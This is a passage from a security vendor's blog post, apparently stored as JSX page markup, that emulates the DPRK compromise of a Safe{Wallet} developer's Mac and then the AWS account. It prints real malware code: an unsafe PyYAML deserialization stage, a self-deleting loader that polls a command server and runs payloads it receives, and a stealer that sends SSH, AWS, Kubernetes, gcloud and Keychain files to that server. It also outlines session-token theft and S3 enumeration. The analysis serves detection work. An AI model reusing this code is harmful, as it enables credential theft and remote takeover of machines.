usage\",width:\"878\",height:\"362\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The \",(0,t.jsx)(e.code,{children:\"data_fetcher.py\"}),\" script includes malicious functionality designed to reach out to an attacker-controlled domain.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image8.png\",alt:\"data_fetcher.py class with yaml.load functionality\",width:\"1287\",height:\"923\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The script, by default, fetches valid stock market-related data. However, based on specific conditions, the attacker-controlled server can return a malicious YAML payload instead. When evaluated using PyYAML\\u2019s unsafe loader (\",(0,t.jsx)(e.code,{children:\"yaml.load()\"}),\"), this payload allows for arbitrary Python object deserialization, resulting in RCE.\"]}),`\n`,(0,t.jsx)(e.h4,{id:\"pyyaml-deserialization-payload\",children:\"PyYAML Deserialization Payload\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"(VT Hash: \",(0,t.jsx)(e.code,{children:\"47e997b85ed3f51d2b1d37a6a61ae72185d9ceaf519e2fdb53bf7e761b7bc08f\"}),\")\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"We recreated this malicious setup by hosting the YAML deserialization payload on a Python+Flask web application, using PythonAnywhere to mimic attacker infrastructure. We updated the malicious URL in the \",(0,t.jsx)(e.code,{children:\"data_fetcher.py\"}),\" script to point to our PythonAnywhere-hosted YAML payload.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"When PyYAML loads and executes the malicious YAML payload, it performs the following actions:\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"First, it creates a directory named \",(0,t.jsx)(e.code,{children:\"Public\"}),\" in the victim\\u2019s home directory.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`directory = os.path.expanduser(\"~\")\ndirectory = os.path.join(directory, \"Public\")\n\nif not os.path.exists(directory):\n    os.makedirs(directory)\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Next, it decodes and writes a base64-encoded Python loader script into a new file named \",(0,t.jsx)(e.code,{children:\"__init__.py\"}),\" within the \",(0,t.jsx)(e.code,{children:\"Public\"}),\" directory.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`filePath = os.path.join(directory, \"__init__.py\")\n\nwith open(filePath, \"wb\") as f:\n    f.write(base64.b64decode(b\"BASE64_ENCODED_LOADER_SCRIPT\"))\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Finally, it executes the newly created \",(0,t.jsx)(e.code,{children:\"__init__.py\"}),\" script silently in the background, initiating the second stage of the attack.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`subprocess.Popen([sys.executable, filePath], start_new_session=True, stdout=DEVNULL, stderr=DEVNULL)\n`})}),`\n`,(0,t.jsx)(e.h4,{id:\"python-loader-script\",children:\"Python Loader Script\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"(VT Hash: \",(0,t.jsx)(e.code,{children:\"937c533bddb8bbcd908b62f2bf48e5bc11160505df20fea91d9600d999eafa79\"}),\")\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"To avoid leaving forensic evidence, the loader first deletes its file (\",(0,t.jsx)(e.code,{children:\"__init__.py\"}),\") after execution, leaving it running in memory only.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`directory = os.path.join(home_directory, \"Public\")\n\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n    try:\n        body_path = os.path.join(directory, \"__init__.py\")\n        os.remove(body_path)\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"This loader\\u2019s primary goal is to establish continuous communication with the Command-and-Control (C2) server. It gathers basic system information\\u2014like OS type, architecture, and system version\\u2014and sends these details to the C2 via an HTTP POST request to the hardcoded /club/fb/status URL endpoint.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`params = {\n        \"system\": platform.system(),\n        \"machine\": platform.machine(),\n        \"version\": platform.version()\n    }\n    while True:\n        try:\n            response = requests.post(url, verify=False, data = params, timeout=180)\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"Based on the server\\u2019s response (ret value), the loader decides its next steps.\"}),`\n`,(0,t.jsx)(e.h5,{id:\"ret--0\",children:\"ret == 0:\"}),`\n`,(0,t.jsx)(e.p,{children:\"The script sleeps for 20 seconds and continues polling.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`if res['ret'] == 0:\n    time.sleep(20)\n    continue\n`})}),`\n`,(0,t.jsx)(e.h5,{id:\"ret--1\",children:\"ret == 1:\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The server response includes a payload in Base64. The script decodes this payload, and writes it to a file\\u2014named \",(0,t.jsx)(e.code,{children:\"init.dll\"}),\" if on Windows or \",(0,t.jsx)(e.code,{children:\"init\"}),\" otherwise\\u2014and then dynamically loads the library using \",(0,t.jsx)(e.code,{children:\"ctypes.cdll.LoadLibrary\"}),\", which causes the payload to run as a native binary.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`elif res['ret'] == 1:\n    if platform.system() == \"Windows\":\n        body_path = os.path.join(directory, \"init.dll\")\n    else:\n        body_path = os.path.join(directory, \"init\")\n        with open(body_path, \"wb\") as f:\n            binData = base64.b64decode(res[\"content\"])\n            f.write(binData)\n            os.environ[\"X_DATABASE_NAME\"] = \"\"\n            ctypes.cdll.LoadLibrary(body_path)\n`})}),`\n`,(0,t.jsx)(e.h5,{id:\"ret--2\",children:\"ret == 2:\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The script decodes the Base64 content into Python source code and then executes it using Python\\u2019s \",(0,t.jsx)(e.code,{children:\"exec()\"}),\" function. This allows for running arbitrary Python code.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`elif res['ret'] == 2:\n    srcData = base64.b64decode(res[\"content\"])\n    exec(srcData)\n`})}),`\n`,(0,t.jsx)(e.h5,{id:\"ret--3\",children:\"ret == 3:\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The script decodes a binary payload (\",(0,t.jsx)(e.code,{children:\"dockerd\"}),\") and a binary configuration file (\",(0,t.jsx)(e.code,{children:\"docker-init\"}),\") into two separate files, sets their permissions to be executable, and then attempts to run them as a new process, supplying the config file as an argument to the binary payload. After execution of the binary payload, it deletes its executable file, leaving the config file on disk for reference.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`elif res['ret'] == 3:\n    path1 = os.path.join(directory, \"dockerd\")\n    with open(path1, \"wb\") as f:\n        binData = base64.b64decode(res[\"content\"])\n        f.write(binData)\n\n    path2 = os.path.join(directory, \"docker-init\")\n    with open(path2, \"wb\") as f:\n        binData = base64.b64decode(res[\"param\"])\n        f.write(binData)\n\n    os.chmod(path1, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |\n                    stat.S_IRGRP | stat.S_IXGRP |\n                    stat.S_IROTH | stat.S_IXOTH)\n\n    os.chmod(path2, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |\n                    stat.S_IRGRP | stat.S_IXGRP |\n                    stat.S_IROTH | stat.S_IXOTH)\n\n    try:\n        process = subprocess.Popen([path1, path2], start_new_session=True)\n        process.communicate()\n        return_code = process.returncode\n        requests.post(SERVER_URL + '/club/fb/result', verify=False, data={\"result\": str(return_code)})\n    except:\n        pass\n\n    os.remove(path1)\n`})}),`\n`,(0,t.jsx)(e.h5,{id:\"ret--9\",children:\"ret == 9:\"}),`\n`,(0,t.jsx)(e.p,{children:\"The script breaks out of its polling loop, terminating further actions.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`elif res['ret'] == 9:\n    break\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"After processing any command, the script continues to poll for further instructions from the C2 server.\"}),`\n`,(0,t.jsx)(e.h4,{id:\"python-loader-emulation\",children:\"Python Loader Emulation\"}),`\n`,(0,t.jsx)(e.p,{children:\"Our goal was to test each of the command options within the loader to better understand what was happening, collect relevant telemetry data, and analyze it for the purpose of building robust detections for both our endpoint and the SIEM.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:\"Ret == 1: Write Library to Disk, Load and Delete Dylib\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The payload we used for this option was a \",(0,t.jsx)(e.a,{href:\"https://github.com/MythicAgents/poseidon\",rel:\"nofollow\",children:\"Poseidon\"}),\" payload compiled as a shared library (\",(0,t.jsx)(e.code,{children:\".dylib\"}),\").\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image9.png\",alt:\"Mythic C2 Payload Builder\",width:\"1573\",height:\"365\"})}),`\n`,(0,t.jsx)(e.p,{children:\"We then base64-encoded the binary and were able to hardcode the path to that base64-encoded payload in our C2 server to be served when testing this specific loader command.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-shell\",children:`base64 poseidon.dylib \u003e poseidon.b64\n`})}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`BINARY_PAYLOAD_B64 = \"BASE64_ENCODED_DYLIB_PAYLOAD\"  # For ret==1\nSTEALER_PAYLOAD_B64 = \"BASE64_ENCODED_STEALER_SCRIPT\" # For ret==2\nMULTI_STAGE_PAYLOAD_B64 = \"BASE64_ENCODED_MULTISTAGE_PAYLOAD\" # For ret==3\n# For testing we simulate a command to send.\n# Options: 0, 1, 2, 3, 9.\n# 0: Idle (sleep); 1: Execute native binary; 2: Execute Python code; 3: Execute multi-stage payload; 9: Terminate.\nCOMMAND_TO_SEND = 1   # Change this value to test different actions\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Once we received our Poseidon payload callback to our \",(0,t.jsx)(e.a,{href:\"https://github.com/its-a-feature/Mythic\",rel:\"nofollow\",children:\"Mythic C2\"}),\" we were able to retrieve credentials using a variety of different methods provided by Poseidon.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Option 1: \",(0,t.jsx)(e.a,{href:\"https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/download.md\",rel:\"nofollow\",children:\"download command\"}),\" - Access file, reads content, sends data back to C2.\",(0,t.jsx)(e.br,{}),`\n`,\"Option 2: \",(0,t.jsx)(e.a,{href:\"https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/getenv.md\",rel:\"nofollow\",children:\"getenv command\"}),\" - Read user environment variables and send content back to C2.\",(0,t.jsx)(e.br,{}),`\n`,\"Option 3: \",(0,t.jsx)(e.a,{href:\"https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport.go\",rel:\"nofollow\",children:\"jsimport\"}),\" \u0026 \",(0,t.jsx)(e.a,{href:\"https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport_call.go\",rel:\"nofollow\",children:\"jsimport_call\"}),\" commands - Import JXA script into memory then call a method within the JXA script to retrieve credentials from file and return contents.\"]}),`\n`,(0,t.jsx)(e.h5,{id:\"ret--2-receive-and-execute-arbitrary-python-code-within-process-memory\",children:\"Ret == 2: Receive and Execute arbitrary Python code within Process Memory\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"(VT Hash: \",(0,t.jsx)(e.code,{children:\"e89bf606fbed8f68127934758726bbb5e68e751427f3bcad3ddf883cb2b50fc7\"}),\")\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The loader script allows for the running of arbitrary Python code or scripts, in memory. In Unit42\\u2019s blog they provided a Python script they observed the DPRK executing via this return value. This script collects a vast amount of data. This data is XOR encoded and sent back to the C2 server via a POST request. For the emulation all that was needed was to add our C2 URL with the appropriate route as defined in our C2 server and base64 encode the script hardcoding its path within our server for when this option was tested.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-py\",children:`def get_info():\n    global id\n    id = base64.b64encode(os.urandom(16)).decode('utf-8')\n    \n    # get xor key\n    while True:\n        if not get_key():\n            break\n\n        base_info()\n        send_directory('home/all', '', home_dir)\n        send_file('keychain', os.path.join(home_dir, 'Library', 'Keychains', 'login.keychain-db'))\n        send_directory('home/ssh', 'ssh', os.path.join(home_dir, '.ssh'), True)\n        send_directory('home/aws', 'aws', os.path.join(home_dir, '.aws'), True)\n        send_directory('home/kube', 'kube', os.path.join(home_dir, '.kube'), True)\n        send_directory('home/gcloud', 'gcloud', os.path.join(home_dir, '.config', 'gcloud'), True)\n        finalize()\n        break\n`})}),`\n`,(0,t.jsx)(e.h5,{id:\"ret--3-write-binary-payload-and-binary-config-to-disk-execute-payload-and-delete-file\",children:\"Ret == 3: Write Binary Payload and Binary Config to Disk, Execute Payload and Delete File\"}),`\n`,(0,t.jsx)(e.p,{children:\"For ret == 3 we used a standard Poseidon binary payload and a \\u201Cconfiguration file\\u201D containing binary data as specified in the loader script. We then base64 encoded both the binary and config file like the ret == 1 option above and hardcoded their paths in our C2 server for serving when testing this command. Same as the ret == 1 option above we were able to use those same commands to collect credentials from the target system.\"}),`\n`,(0,t.jsx)(e.h4,{id:\"c2-infrastructure\",children:\"C2 Infrastructure\"}),`\n`,(0,t.jsx)(e.p,{children:\"We created a very simple and small C2 server, built with Python+Flask, intended to listen with a specified port on our Kali Linux VM and evaluate incoming requests, responding appropriately based on the route and return value we wished to test.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image15.png\",alt:\"Custom Python+Flask C2 Server\",width:\"1898\",height:\"458\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"We also used the open source \",(0,t.jsx)(e.a,{href:\"https://github.com/its-a-feature/Mythic\",rel:\"nofollow\",children:\"Mythic C2\"}),\" in order to facilitate the creation and management of the Poseidon payloads we used. Mythic is an open source C2 framework created and maintained by \",(0,t.jsx)(e.a,{href:\"https://github.com/its-a-feature\",rel:\"nofollow\",children:\"Cody Thomas\"}),\" at \",(0,t.jsx)(e.a,{href:\"https://specterops.io/\",rel:\"nofollow\",children:\"SpecterOps\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image14.png\",alt:\"Mythic C2 Active Callbacks Interactive Agent Window\",width:\"1999\",height:\"774\"})}),`\n`,(0,t.jsx)(e.h4,{id:\"malicious-python-application-docker-version\",children:\"Malicious Python Application: Docker Version\"}),`\n`,(0,t.jsx)(e.p,{children:\"We also explored a Dockerized variant of the malicious Python application. This version was packaged in a minimal Python Docker container (python:3.12.2-slim) running in privileged mode, granting it the ability to access host resources.\"}),`\n`,(0,t.jsx)(e.p,{children:\"A containerized application creates a telemetry and detection blind spot on macOS because Apple's Endpoint Security Framework (ESF) lacks the ability to introspect containerized processes. While ESF and endpoint detection solutions can still observe the trusted Docker process accessing sensitive host files\\u2014such as SSH keys, AWS credentials, or user configuration data\\u2014these actions commonly align with standard developer workflows. As a result, security tools are less likely to scrutinize or trigger alerts on containerized activities, offering attackers increased stealth when operating from within Docker environments.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"This highlights the necessity for additional monitoring like \",(0,t.jsx)(e.a,{href:\"https://www.osquery.io/\",rel:\"nofollow\",children:\"OSQuery\"}),\" and \",(0,t.jsx)(e.a,{href:\"https://www.docker.com/\",rel:\"nofollow\",children:\"Docker\"}),\" log file collection to complement standard macOS endpoint defenses. Elastic offers both \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/docs/reference/integrations/osquery_manager\",rel:\"nofollow\",children:\"OSQuery\"}),\" and \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container\",rel:\"nofollow\",children:\"Docker\"}),\" log file collection via our \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/integrations/data-integrations\",rel:\"nofollow\",children:\"data integrations\"}),\" for Elastic Agent alongside our Endpoint protection features.\"]}),`\n`,(0,t.jsx)(e.h4,{id:\"macos-emulation-conclusion\",children:\"MacOS Emulation Conclusion\"}),`\n`,(0,t.jsx)(e.p,{children:\"Our emulation recreated the attack against the SAFE developers\\u2019 macOS system end-to-end using the real world payloads.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:\"Malicious Python App:\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"We began by replicating the malicious Python application described in both Mandiant\\u2019s findings and Unit42\\u2019s report. The attackers had forked a legitimate open-source application and embedded RCE access within \",(0,t.jsx)(e.code,{children:\"data_fetcher.py\"}),\". This script made outbound requests to an attacker-controlled server and conditionally fetched a malicious YAML file. Using PyYAML\\u2019s \",(0,t.jsx)(e.code,{children:\"yaml.load()\"}),\" with an unsafe loader, the attacker triggered arbitrary code execution via deserialization.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:\"PyYAML Payload Deserialization resulting in Python Loader Script Execution:\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The YAML payload wrote a base64-encoded second-stage loader to \",(0,t.jsx)(e.code,{children:\"~/Public/__init__.py\"}),\" and executed it in a detached process. We mimicked this exact flow using a Flask-based staging server hosted on PythonAnywhere.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:\"Python Loader Execution \u0026 C2 Interaction:\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Once launched, the loader deleted its on disk file and beaconed to our emulated C2, awaited tasking. Based on the C2\\u2019s response code (\",(0,t.jsx)(e.code,{children:\"ret\"}),\"), we tested the following actions:\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"ret == 1\"}),\": The loader decoded a Poseidon payload (compiled as a \",(0,t.jsx)(e.code,{children:\".dylib\"}),\") and executed it using \",(0,t.jsx)(e.code,{children:\"ctypes.cdll.LoadLibrary()\"}),\", resulting in native code execution from disk.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"ret == 2\"}),\": The loader executed an in-memory Python stealer, matching the script shared by Unit42. This script collected system, user, browser, and credential data and exfiltrated it via XOR-encoded POST requests.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"ret == 3\"}),\": The loader wrote a Poseidon binary and a separate binary configuration file to disk, executed the binary with the config as an argument, then deleted the payload.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"ret == 9\"}),\": The loader terminated its polling loop.\"]}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:\"Data Collection: Pre-Pivot Recon \u0026 Credential Access:\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"During our \",(0,t.jsx)(e.strong,{children:\"ret == 2\"}),\" test, the Python stealer gathered:\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[\"macOS system information (\",(0,t.jsx)(e.code,{children:\"platform\"}),\", \",(0,t.jsx)(e.code,{children:\"os\"}),\", \",(0,t.jsx)(e.code,{children:\"user\"}),\")\"]}),`\n`,(0,t.jsx)(e.li,{children:\"Chrome user data (Bookmarks, Cookies, Login Data, etc.)\"}),`\n`,(0,t.jsxs)(e.li,{children:[\"SSH private keys (\",(0,t.jsx)(e.code,{children:\"~/.ssh\"}),\")\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"AWS credentials (\",(0,t.jsx)(e.code,{children:\"~/.aws/credentials\"}),\")\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"macOS Keychain files (\",(0,t.jsx)(e.code,{children:\"login.keychain-db\"}),\")\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"GCP/Kube config files from \",(0,t.jsx)(e.code,{children:\".config/\"})]}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:\"This emulates the pre-pivot data collection that preceded cloud exploitation, and reflects how DPRK actors harvested AWS credentials from the developer\\u2019s local environment.\"}),`\n`,(0,t.jsx)(e.p,{children:\"With valid AWS credentials, the threat actors then pivoted into the cloud environment, launching the second phase of this intrusion.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image22.png\",alt:\"AWS cloud compromise execution flow\",width:\"960\",height:\"540\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"aws-cloud-compromise\",children:\"AWS cloud compromise\"}),`\n`,(0,t.jsx)(e.h4,{id:\"pre-requisities-and-setup\",children:\"Pre-requisities and Setup\"}),`\n`,(0,t.jsx)(e.p,{children:\"To emulate the AWS stage of this attack, we first leveraged Terraform to stand up the necessary infrastructure. This included creating an IAM user (developer) with an overly permissive IAM policy granting access to S3, IAM, and STS APIs. We then pushed a locally built Next.js application to an S3 bucket and confirmed the site was live, simulating a simple Safe{Wallet} frontend.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Our choice of \",(0,t.jsx)(e.code,{children:\"Next.js\"}),\" was predicated on the original S3 bucket static site path - \",(0,t.jsx)(e.code,{children:\"https://app[.]safe[.]global/_next/static/chunks/pages/_app-52c9031bfa03da47.js\"})]}),`\n`,(0,t.jsx)(e.p,{children:\"Before injecting any malicious code, we verified the integrity of the site by performing a test transaction using a known target wallet address to ensure the application responded as expected.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image1.png\",alt:\"Transaction by custom frontend static site\",width:\"1932\",height:\"1220\"})}),`\n`,(0,t.jsx)(e.h4,{id:\"temporary-session-token-retrieval\",children:\"Temporary Session Token Retrieval\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Following the initial access and post-compromise activity on the developer\\u2019s macOS workstation, early assumptions focused on the adversary retrieving credentials from default AWS configuration locations - such as \",(0,t.jsx)(e.code,{children:\"~/.aws\"}),\" or from user environment variables. It was later confirmed by Unit42\\u2019s blog that the Python stealer script targeted AWS files. These locations often store long-term IAM credentials or temporary session tokens used in standard development workflows. Based on public reporting, however, this specific compromise involved AWS user session tokens, not long-term IAM credentials. In our emulation, as the developer we added our virtual MFA device to our IAM user, enabled it and then retrieved our user session token and exported the credentials to our environment. Note that on our Kali Linux endpoint, we leveraged ExpressVPN - as done by the adversaries - for any AWS API calls or interactions with the developer box.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"It is suspected that the developer obtained temporary AWS credentials either by the \",(0,t.jsx)(e.a,{href:\"https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html\",rel:\"nofollow\",children:\"GetSessionToken\"}),\" API operation or by logging in via AWS Single Sign-On (SSO) using the AWS CLI. Both methods result in short-lived credentials being cached locally and usable for CLI or SDK-based interactions. These temporary credentials were then likely cached in the \",(0,t.jsx)(e.code,{children:\"~/.aws\"}),\" files or exported as environment variables on the macOS system.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"In the \",(0,t.jsx)(e.em,{children:\"GetSessionToken\"}),\" scenario, the developer would have executed a command as such:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-shell\",children:`aws sts get-session-token --serial-number \"$ARN\" --token-code \"$FINAL_CODE\"  --duration-seconds 43200 --profile \"$AWS_PROFILE\" --output json\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"In the SSO-based authentication scenario, the developer may have run:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-shell\",children:`aws configure sso \naws sso login -profile \"$AWS_PROFILE\" -use-device-code \"OTP\"\\`\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Either method results in temporary credentials (access key, secret and session token) being saved in \",(0,t.jsx)(e.code,{children:\"~/.aws\"}),\" files and made available to the configured AWS profile. These credentials are then used automatically by tools like the AWS CLI or SDKs like Boto3 unless overridden. In either case, if malware or an adversary had access to the developer\\u2019s macOS system, these credentials could have been easily harvested from the environment variables, AWS config cache or credentials file.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"To obtain these credentials for Developer1 were created a custom script for quick automation. It created a virtual MFA device in AWS, registered the device with our Developer1 user, then called \",(0,t.jsx)(e.code,{children:\"GetSessionToken\"}),\" from STS - adding the returned temporary user session credentials to our macOS endpoint as environment variables as shown below.\"]}),`\n`,(0,t.jsx)(e.h4,{id:\"mfa-device-registration-attempts\",children:\"MFA Device Registration Attempts\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image20.png\",alt:\"Registering our MFA device for the developer and retrieving user session token via shellscript\",width:\"1032\",height:\"518\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"One key assumption here is that the developer was working with a user session that had MFA enabled, either for direct use or to assume a custom-managed IAM role. Our assumption derives from the credential material compromised - AWS temporary user session tokens, which are not obtained from the console but rather requested on demand from STS. Temporary credentials returned from \",(0,t.jsx)(e.code,{children:\"GetSessionToken\"}),\" or SSO by default expire after a certain number of hours, and a session token with the ASIA* prefix would suggest that the adversary harvested a short-lived but high-impact credential. This aligns with behaviors seen in previous DPRK-attributed attacks where credentials and configurations for Kubernetes, GCP, and AWS were extracted and reused.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image11.png\",alt:\"Environment variables output of our AWS user session token after GetSessionToken call\",width:\"1999\",height:\"650\"})}),`\n`,(0,t.jsx)(e.h4,{id:\"assuming-the-compromised-identity-on-kali\",children:\"Assuming the Compromised Identity on Kali\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Once the AWS session token was collected, the adversary likely stored it on their Kali Linux system either in the standard AWS credential locations (e.g., \",(0,t.jsx)(e.code,{children:\"~/.aws/credentials\"}),\" or as environment variables) or potentially in a custom file structure, depending on tooling in use. While the AWS CLI defaults to reading from \",(0,t.jsx)(e.code,{children:\"~/.aws/credentials\"}),\" and environment variables, a Python script leveraging Boto3 could be configured to source credentials from nearly any file or path. Given the speed and precision of the post-compromise activity, it is plausible that the attacker used either the AWS CLI, direct Boto3 SDK calls, or shell scripts wrapping CLI commands - all of which offer convenience and built-in request signing.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"What seems less likely is that the attacker manually signed AWS API requests using SigV4, as this would be unnecessarily slow and operationally complex. It\\u2019s also important to note that no public blog has disclosed which user agent string was associated with the session token usage (e.g. aws-cli, botocore, etc.), which leaves uncertainty around the attacker\\u2019s exact tools. That said, given DRPK\\u2019s established reliance on Python and the speed of the attack, CLI or SDK usage remains the most reasonable assumption.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image16.png\",alt:\"MythicC2 getenv command output\",width:\"1999\",height:\"867\"})}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"Note:\"}),\" We did this in emulation with our Poseidon payload prior to Unit 42\\u2019s blog about the RN Loader capabilities.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"It\\u2019s important to clarify a nuance about the AWS authentication model: using a session token does not \",(0,t.jsx)(e.a,{href:\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_control-access_getsessiontoken.html\",rel:\"nofollow\",children:\"inherently block access to IAM API actions\"}),\" - even actions like \",(0,t.jsx)(e.a,{href:\"https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateVirtualMFADevice.html\",rel:\"nofollow\",children:\"CreateVirtualMFADevice\"}),\" - as long as the session was initially established with MFA. In our emulation, we attempted to replicate this behavior using a stolen session token that had MFA context. Interestingly, our attempts to register an additional MFA device failed, suggesting that there may be additional safeguards, such as explicit policy constraints, that prevent MFA registration via session tokens or the details of this behavior are still too vague and we incorrectly mimicked the behavior. While the exact failure reason remains unclear, this behavior warrants deeper investigation into the IAM policies and authentication context associated with session-bound actions.\"]}),`\n`,(0,t.jsx)(e.h4,{id:\"s3-asset-enumeration\",children:\"S3 Asset Enumeration\"}),`\n`,(0,t.jsx)(e.p,{children:\"After credential acquisition, the attacker likely enumerated accessible AWS services. In this case, Amazon S3 was a clear target. The attacker would have listed buckets available to the compromised identity across all regions and located a public-facing bucket associated with Safe{Wallet}, which hosted the frontend Next.js application for transaction processing.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"We assume the attacker was aware of the S3 bucket due to its role in serving content for \",(0,t.jsx)(e.code,{children:\"app.safe[.]global\"}),\", meaning the bucket's structure and assets could be publicly browsed or downloaded without authentication. In our emulation, we validated similar behavior by syncing assets from a public S3 bucket used for static site hosting.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image6.png\",alt:\"Bucket containing statically hosted frontend static site assets\",width:\"1080\",height:\"108\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image21.png\",alt:\"Statically hosted frontend static site assets in target bucket\",width:\"1276\",height:\"260\"})}),`\n`,(0,t.jsx)(e.h4,{id:\"nextjs-app-overwrite-with-malicious-code\",children:\"Next.js App Overwrite with Malicious Code\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"After discovering the bucket, the attacker likely used the aws s3 